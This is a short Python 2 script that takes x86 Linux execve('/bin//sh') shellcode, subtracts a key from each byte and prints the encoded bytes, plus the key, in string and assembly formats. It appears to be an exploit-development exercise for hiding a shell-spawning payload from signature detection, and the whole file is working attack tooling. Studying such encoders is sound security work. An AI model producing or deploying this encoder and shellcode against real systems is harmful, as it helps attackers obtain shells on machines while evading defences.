#!/usr/bin/python
import sys
key = 0x0A
shellcode = ("\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
encoded = ""
encoded2 = ""
for x in bytearray(shellcode) :
        y = (x - key)
        encoded += '\\x%02x' % (y & 0xff)
        encoded2 += '0x%02x,' % (y & 0xff)
encoded += '\\x%02x' % key
encoded2 += '0x%02x' % key
print "Encoded shellcode (len %d):" % len(bytearray(shellcode))
print encoded
print "\nShellcode converted to ASM format (len %d):" % len(bytearray(shellcode))
print encoded2
